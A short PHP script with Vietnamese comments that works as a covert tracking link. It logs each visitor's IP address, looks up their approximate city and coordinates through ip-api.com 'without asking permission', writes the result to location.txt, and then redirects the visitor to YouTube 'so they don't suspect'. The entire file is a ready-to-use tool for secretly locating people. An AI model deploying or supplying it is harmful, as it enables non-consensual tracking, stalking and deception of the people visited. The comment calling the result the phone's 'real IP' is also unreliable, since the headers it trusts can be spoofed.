<?php
// 1. Lấy địa chỉ IP thật của điện thoại người dùng
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// 2. Sử dụng API dịch vụ bên thứ 3 để giải mã IP ra tọa độ (Miễn phí và không hỏi quyền)
$api_url = "http://ip-api.com/json/" . $ip;
$response = file_get_contents($api_url);
$data = json_decode($response, true);

// 3. Kiểm tra xem API có lấy được dữ liệu thành công không
if ($data && $data['status'] == 'success') {
    $lat = $data['lat'];
    $lon = $data['lon'];
    $city = $data['city'];
    $country = $data['country'];
    
    // Định dạng nội dung ghi vào file log
    $log_data = "Thời gian: " . date("Y-m-d H:i:s") . " | IP: $ip | Quốc gia: $country | Thành phố: $city | Tọa độ: $lat, $lon\n";
} else {
    $log_data = "Thời gian: " . date("Y-m-d H:i:s") . " | IP: $ip (Không quét được tọa độ qua IP này)\n";
}

// 4. Lưu trực tiếp vào file location.txt
file_put_contents('location.txt', $log_data, FILE_APPEND);

// 5. Chuyển hướng người dùng sang một trang khác (ví dụ Google hoặc Youtube) để họ không nghi ngờ
header('Location: https://www.youtube.com');
exit();
?>
